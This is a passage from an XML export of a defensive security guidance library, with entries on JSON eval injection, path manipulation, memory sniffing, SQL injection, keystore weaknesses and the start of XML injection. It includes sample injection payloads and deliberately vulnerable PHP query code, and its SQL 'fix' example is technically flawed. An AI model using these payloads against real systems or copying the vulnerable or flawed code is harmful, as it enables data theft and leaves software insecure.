 to include cleverly formatted malicious JavaScript. Suppose that instead of &amp;quot;Away&amp;quot; the value is changed to the following:&lt;/p&gt;
&lt;pre&gt;Away&amp;quot;});alert(&amp;quot;Gotcha!&amp;quot;);//&lt;/pre&gt;
&lt;p&gt;The first thing to notice is that the JSON object, which represents a the contact status list, is valid JavaScript. Because of this the eval() can be used to evaluate it. The above code completes the status object, inserts additional JavaScript, and comments
 out the rest of the line. When the code is passed as to the eval() function the additional JavaScript is run. Note that &amp;quot;alert(&amp;quot;Gotcha!&amp;quot;)&amp;quot; can be replaced with any malicious JavaScript and it will be run in the client's browser. Because the above code is an
 example, an alert message window will be displayed. In general, however, JavaScript could be downloaded and executed without the user's knowledge.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on AJAX including common vulnerabilities that are associated with the technology, see &amp;quot;Ajax Security Basics&amp;quot;:
&lt;a href="http://www.securityfocus.com/infocus/1868"&gt;http://www.securityfocus.com/infocus/1868&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;For information on AJAX attacks and JavaScript Hijacking, see &amp;quot;JavaScript Hijacking&amp;quot;:
&lt;a href="http://www.fortifysoftware.com/servlet/downloads/public/JavaScript_Hijacking.pdf"&gt;
http://www.fortifysoftware.com/servlet/downloads/public/JavaScript_Hijacking.pdf&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Attack: Cross Site Scripting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D"&gt;Attack: Command Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:685CA8C0-E102-4517-A539-4B826D1962EB"&gt;Attack: Double Encoding Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3EB8979E-59F0-4C2B-8D8A-CFB173E5D66B"&gt;Attack: HTTP Session Hijacking Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:208A476B-ABCA-4630-9D02-746C52F47017"&gt;Attack: XML Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:42F599F0-D1D6-4F25-9CC2-D5473F19113F"&gt;Guideline: Validate All Data Passed Between Native and Java Code
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DD60FFDF-904D-45A8-8278-F3E8CEBA911F"&gt;Guideline: Do Not Rely on Request Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:58F9B51D-794F-4CFC-B568-7F5E55DEB402"&gt;Guideline: Do Not Rely on Client-Side Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:2D8158D1-E2D1-459F-9BD7-56D4B979EFE3"&gt;Guideline: Encode All Output Data
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909"&gt;Guideline: Validate Input for Length, Range, Format, and Type
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43"&gt;Guideline: Validate Input from All Sources
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>2b2a09fd-a10d-479f-a3df-8e28870319b6</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>File Name and Path Manipulation Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;All applications which use user input to construct the file name or path before accessing a file resource.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;If user input is used to construct a filename or path it is possible for that input to be format so that an unintended or protected file is read, modified, or executed instead. This is commonly accomplished by exploiting canonicalization issues or alternate
 data streams. Command injection may also be possible and would allow the attacker to execute arbitrary commands. The impact of such vulnerabilities is compounded if the application is running with elevated privileges.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Command execution via command injection: See &lt;a href="?#ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D"&gt;
Command Injection Attack&lt;/a&gt; &lt;/li&gt;&lt;li&gt;Reading data from or writing to protected files. Some examples:
&lt;ul&gt;
&lt;li&gt;Making the application load\overwrite another user's configuration or data file.
&lt;/li&gt;&lt;li&gt;Reading from or writing to protected application or system log files.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Lack of or improper validation of user supplied input.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Use proper file permissions to ensure that only authorized users can access sensitive files.
&lt;/li&gt;&lt;li&gt;If granular file permissions is not an option, then resolve file names and paths completely and verify them for access.
&lt;/li&gt;&lt;li&gt;Avoid the problem by designing software that does not need user input for filenames. One simple solution is to generate unique random filenames and use a dictionary to associate them with a user supplied label.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more inofrmation on path manipulation, see the &lt;a href="http://www.owasp.org/index.php/Path_Manipulation"&gt;
OWASP Path Manipulation&lt;/a&gt; article. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D"&gt;Attack: Command Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF"&gt;Attack: Client-side Validation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:C7AC7D00-4AEA-4AFA-AD2D-1E812664BA38"&gt;Attack: Canonicalization Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:42F599F0-D1D6-4F25-9CC2-D5473F19113F"&gt;Guideline: Validate All Data Passed Between Native and Java Code
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DD60FFDF-904D-45A8-8278-F3E8CEBA911F"&gt;Guideline: Do Not Rely on Request Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:EF6A139B-9368-42FE-AAF4-548451CF8004"&gt;Guideline: Use a Least-Privileged Account for Running Applications
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93"&gt;Guideline: Do Not Rely on Client-Side Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:897EEB0A-23C9-4699-A400-925FFC32C11E"&gt;Guideline: Filter All User-Supplied Filename and Path Input
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43"&gt;Guideline: Validate Input from All Sources
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909"&gt;Guideline: Validate Input for Length, Range, Format, and Type
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>46936d40-83f3-420e-8422-a7bd78f4e418</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Sniff Memory for Secrets Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Cryptography</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;Local applications that deal with secret data such as passwords, encryption keys, etc.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;Attackers often scan the memory space of a locally running application if they need to find certain secrets that the application contains. This is because developers are usually lax when dealing with sensitive data securely when the data is inside the application's
 own memory space.&lt;/p&gt;
&lt;p&gt;It is common knowledge that in most modern operating systems, an application's memory space is protected and is not accessible by other applications on the same system. However, reading and modifying another application's memory is also essential for debuggers
 to work. For this purpose, operating systems contain workarounds to accomodate reading and writing to another application's memory. This allows any application on the system to debug another process and read its memory content. Although operating systems do
 require the debugger process to have special permissions in order to debug another application, this still remains a problem in situations where users have administrative privileges on their local machines.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Disclosure of sensitive information to an attacker: This could be a an encryption key, another user's personal information or any other data that an attacker should not have access to.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Storing clear-text sensitive information in memory. &lt;/li&gt;&lt;li&gt;Using obfuscation techniques instead of stronger protection mechanisms for sensitive information in memory.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Encrypt secret data&lt;/strong&gt;: When sensitive data is present in application memory, it should be encrypted and the clear-text data should be overwritten as soon as possible. Freeing a variable does not clear the data it holds from memory; therefore
 it is important to remember to explicitly overwrite the memory segment where sensitive information was stored.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Store sensitive data in mutable objects&lt;/strong&gt;: Mutable objects allow the data in them to be overwritten. This is especially useful in managed languages as objects are required to be deallocated through the garbage collector. Therefore there is
 no certainty when the sensitive data will be deallocated from the current process space.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Clear all sensitive data instances&lt;/strong&gt;: Make sure that all memory locations, where sensitive data has been stored, are cleared/overwritten after their use. Losing a pointer to a sensitive data instance can result in not cleaning that particular
 memory and allowing the sensitive data to leak.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on secrets in memory, see: &lt;a href="http://msdn2.microsoft.com/en-us/library/aa480477.aspx#pagguidelines0003_sens2"&gt;
Minimize the exposure of secrets in memory&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:C147A5A0-50E5-4918-ABC1-FFC2620DBFCC"&gt;Attack: Reverse Engineering Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:88F94A19-9E01-4854-B549-3039F2320C99"&gt;Attack: Reflection Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4507A940-9C44-4FD9-A946-97B2CD53D08E"&gt;Attack: Local Machine Credential Sniffing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:6797C879-EB8A-43AC-87D0-92E1EB6AA2AD"&gt;Attack: Luring Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:6DBF488B-FF3B-45A6-B83A-BFB8BD17E415"&gt;Attack: API Hijacking Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8EDBAC9F-BFCF-43DF-A4FA-5BB7E03E7410"&gt;Guideline: Do Not Leave Passwords in Memory
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:E5D7DA05-EB59-46C5-AF9F-BA1B32C783CE"&gt;Guideline: Clear Sensitive Data from Memory when No Longer Used
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3211752B-87ED-476D-A1EE-735A5142F4ED"&gt;Guideline: Do Not Cache Sensitive Data
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>4e2f567c-e829-4710-9e2d-861757fb1854</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>SQL Injection Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;Any application that interacts with a SQL database.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;A SQL injection attack exploits vulnerabilities in input validation to run arbitrary commands in the database. It can occur when your application uses input to construct dynamic SQL statements to access the database. It can also occur if your code uses stored
 procedures that are passed strings that contain raw user input. Using the SQL injection attack, an attacker can execute arbitrary commands in your database, with all the privileges granted to the process being attacked. The issue is magnified if the application
 uses an over-privileged account to connect to the database. In this instance it is possible to use the database server to run operating system commands and potentially compromise other servers, in addition to being able to retrieve, manipulate, and destroy
 data. &lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality&lt;/strong&gt;: Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Authentication&lt;/strong&gt;: If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Authorization&lt;/strong&gt;: If authorization information is held in an SQL database, it may be possible to change this information through the successful exploitation of an SQL injection vulnerability.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Integrity&lt;/strong&gt;: Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with an SQL injection attack.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;The capabilities of an attacker are constrained by the permissions of the account you use to connect to the database. For this reason, your application should connect to the database with an account that has the minimum necessary set of privileges.
&lt;/p&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Weak input validation. &lt;/li&gt;&lt;li&gt;Dynamic construction of SQL statements without the use of type-safe parameters.
&lt;/li&gt;&lt;li&gt;Use of over-privileged database logins. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Constrain input.&lt;/strong&gt; Use vigorous white-list style checking and type checking on any user input that may be used in an SQL command. Rather than escape meta-characters, it is safest to avoid adding them to your white-list. Later use of data
 that has been entered in the database may neglect to escape meta-characters before use.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use Parameterized SQL statements and stored procedures. &lt;/strong&gt;Parameterized SQL statements will process characters that have special meaning to SQL (like single quote) without negative security implications.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use escaping routines&lt;/strong&gt;. If you cannot use parameters and must use dynamic SQL, use escaping routines to handle special characters that have meaning to the database.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use an account with limited permissions in the database&lt;/strong&gt;. Ideally the account should only have execute permissions on the set of stored procedures that your application needs to use and it should have no direct table access.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Do not echo database errors&lt;/strong&gt;. Catch exceptions on the server and return generic error messages to the client.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Example&lt;/h1&gt;
&lt;p&gt;While it is easier and more reliable to fix SQL injection by parameterization, it can be fixed without it. Suppose we have a PHP/MySQL application that has two tables: users and products. Each row in the USER table contains the users ID, name, password,
 credit card number, and address. Similarly, the product table has a column for the product ID, description, and price. The application contains a SQL Query that retrieves the description of a product given its ID.&lt;/p&gt;
&lt;pre&gt;$query = &amp;quot;SELECT description FROM products WHERE product_id = &amp;quot; &amp;#43; $prod_id &amp;#43; &amp;quot;;&amp;quot;;$result = mysql_query($query);&lt;/pre&gt;
&lt;p&gt;So, if the value of $prod_id is 5 then $query reads:&lt;/p&gt;
&lt;pre&gt;SELECT description FROM products WHERE product_id = 5;&lt;/pre&gt;
&lt;p&gt;An attacker enters the following string where the application asks for the product ID (expecting a number):&lt;/p&gt;
&lt;pre&gt;5; SELECT * from users&lt;/pre&gt;
&lt;p&gt;Now $query has the following value which is a perfectly legitimate SQL query:&lt;/p&gt;
&lt;pre&gt;SELECT description FROM products WHERE product_id = 5; SELECT * from users;&lt;/pre&gt;
&lt;p&gt;The query is executed and the product description is returned along with every row in the User table and the attacker has all of the confidential information from the database.
&lt;/p&gt;
&lt;p&gt;Every situation and programming language presents its own challenge but in this case we can escape the character sequence so that MySQL interprets the entire user-supplied string as part of the WHERE clause. The PHP function to do this is mysql_real_escape_string().&lt;/p&gt;
&lt;pre&gt;$query = &amp;quot;SELECT description FROM products WHERE product_id = &amp;quot; &amp;#43;  mysql_real_escape_string($prod_id) &amp;#43; &amp;quot;;&amp;quot;;$result = mysql_query($query);&lt;/pre&gt;
&lt;p&gt;The value of $query should now look like the following:&lt;/p&gt;
&lt;pre&gt;SELECT description FROM products WHERE product_id = \'5; SELECT * from users\';&lt;/pre&gt;
&lt;p&gt;All potentially dangerous characters in the string provided by the user have been escaped and it can be safely put in a MySQL query.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/SQL_injection"&gt;http://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.php.net/manual/en/security.database.sql-injection.php"&gt;http://www.php.net/manual/en/security.database.sql-injection.php&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://msdn2.microsoft.com/en-us/library/ms998271.aspx"&gt;http://msdn2.microsoft.com/en-us/library/ms998271.aspx&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.unixwiz.net/techtips/sql-injection.html"&gt;http://www.unixwiz.net/techtips/sql-injection.html&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1CCC080F-9290-4BD2-8A2C-6A45F59727B0"&gt;Attack: Xpath-XQuery Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0"&gt;Attack: LDAP Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF"&gt;Attack: Client-side Validation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662"&gt;Guideline: Use Stored Procedures
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:42F599F0-D1D6-4F25-9CC2-D5473F19113F"&gt;Guideline: Validate All Data Passed Between Native and Java Code
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:AEFDE06D-281E-493B-85FE-BAA586684857"&gt;Guideline: Allow Only Trusted Hosts to Connect to Database Server
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9DF701E2-7929-4533-9DC3-368AAC4E553D"&gt;Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:0FFC3880-7F2B-47A5-BC54-F9BD39117BDD"&gt;Guideline: Validate Input from All Sources
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:81491E66-67B7-49F3-BDA6-4B4C9245C702"&gt;Guideline: Validate All Input Passed to Database
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>64a5d86e-5d3c-4afc-b0b0-3a711652e484</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Weak Keystore Protection Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Encryption</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;Applications using cryptography.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;A keystore is a secure location on disk or in memory that can be used to store cryptographic keys or trusted certificates. Typically, these keys are bound to the machine and only available to a certain application. If the application uses a weak keystore,
 it may be possible to recover the keys and certificates from the keystore without proper credentials.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Information Disclosure:&lt;/strong&gt; The attacker can gain access to the keys used by the application, allowing them to decrypt data the application attempts to protect with encryption, and to spoof the application to itself or other systems which trust
 data encrypted with those keys. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Elevation of Privilege:&lt;/strong&gt; The attacker may also be able to add new keys to the keystore or modify existing ones. This can result in the application trusting keys controlled by the attacker for sensitive operations or communicating with other
 systems.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Using a Weak Keystore:&lt;/strong&gt; Many operating environments provide a variety of key stores, some of which exist only for legacy reasons. Using an older version of a key store or a poorly implemented third party key store is likely to result in
 a key store compromise. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Improperly Configuring a Strong Keystore:&lt;/strong&gt; Many keystores support a variety of configuration options which allow for a wide range of security choices. Understanding the properties of your key store is essential to using it securely.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Implementing a Custom or Homegrown Keystore:&lt;/strong&gt; Strong keystores are both very tricky to write and require support from the operating environment. Attempting to write one should be considered on the same level as implementing a custom encryption
 algorithm or protocol, and should be avoided. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Poor Key Handling:&lt;/strong&gt; If the application isn't careful with how it manages keys when it adds them to the store or reads them out from the store for use, both key compromise and key disclosure are possible, even if the key store itself is strong.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use a Strong Keystore:&lt;/strong&gt; Which key store to use will vary by your platform. In Java, use the
&lt;strong&gt;KeyStore&lt;/strong&gt; class. On Windows, use DPAPI. Ensure that you are using the current version of the key store for your platform, including any patches.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Configure Your Keystore Correctly:&lt;/strong&gt; Ensure that you know how to properly configure the key store in your environment. Ensure that any ACLs on the key store are locked down as tightly as possible while still allowing your system to function.
 For instance, after the initial install, it is unlikely that your application will need rights to add keys to the key store, nor rights to change the permissions on the key store; if possible, make sure the application gives these up after installation. Ensure
 that, if possible, all cryptographic operations occurr within the scope of the protected keystore, instead of manual exporting keys from the store or reading the bits out; if you can do this and you can lock your key store down even further, ensure that these
 operations cannot be performed on the key store. If you have a choice of keys or algorithms used to protect keys in the key store, ensure that they are appropriately strong.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure Proper Key Handling:&lt;/strong&gt; Handle your key material very carefully. Place keys in the key store as soon as possible and read them out as late as possible. Do not leave keys in memory when you do not need them, and ensure that the memory
 that you load them into is properly zeroed out. Be careful with immutable objects and garbage collection when handling key data. Under no circumstances should cleartext keys be written out to disk; among other things, make sure that you pin memory with sensitive
 data so that it will not be written out to swap.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://java.sun.com/j2se/1.4.2/docs/api/java/security/KeyStore.html"&gt;http://java.sun.com/j2se/1.4.2/docs/api/java/security/KeyStore.html&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://msdn2.microsoft.com/en-us/library/ms995355.aspx"&gt;http://msdn2.microsoft.com/en-us/library/ms995355.aspx&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:235E588E-621B-4C5E-A50E-8EA447330AD0"&gt;Guideline: Use a Secure Key Storage Location
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:6D0F24EA-B130-4AAE-9EDF-0B27F04B3145"&gt;Attack: Credentials Brute Force Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E"&gt;Attack: Key Bruteforce Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4507A940-9C44-4FD9-A946-97B2CD53D08E"&gt;Attack: Local Machine Credential Sniffing Attack&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>73777936-5891-48b0-a3e8-71663e3429a1</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>XML Injection Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;Any application that writes user input to an XML file on a server.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;An XML injection vulnerability will allow an attacker to insert malicious data into XML which resides on the server. Depending on the type of XML parser used (SAX or DOM), this malicious data could be used to either overwrite the values in previous nodes
 or cause the XML parser to consume an excessive amount of memory on the server.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
